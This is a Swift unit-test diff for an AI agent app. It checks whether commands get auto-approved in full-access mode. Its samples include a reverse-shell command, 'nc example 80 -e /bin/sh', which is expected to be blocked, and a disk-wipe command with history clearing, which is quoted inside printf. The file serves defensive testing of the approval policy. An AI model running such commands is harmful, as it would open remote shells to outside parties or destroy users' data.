@@ -4,6 +4,24 @@ import WillDeepCore
 @testable import WillDeep
 
 struct AgentApprovalModePolicyTests {
+    @Test("完全访问日志检索不会组合文本与其他命令的参数")
+    @MainActor
+    func fullAccessLogQueryKeywordBoundary() async {
+        let appState = AppState()
+        let samples: [(String, Bool)] = [
+            (#"ssh -o BatchMode=yes root@example 'J="journalctl -u sslcat --no-pager"; eval $J | sort | uniq -c; journalctl -u niuwo | grep -c "gateway images sync bridge wait"'"#, true),
+            (#"printf '%s' 'mkfs.ext4 /dev/sda; history -c'"#, true),
+            (#"ssh example 'nc example 80 -e /bin/sh'"#, false),
+        ]
+        for (command, allowed) in samples {
+            let source = await appState.autoApprovalSource(
+                toolName: "run_command", arguments: ["command": .string(command)],
+                risk: .write, rootDirectory: nil, approvalMode: .fullAccess
+            )
+            #expect((source == .fullAccess) == allowed)
+        }
+    }
+
     @Test("视觉检查自动通过智能审核，严格模式仍需确认")
     @MainActor
     func visualQAApprovalBoundary() async {
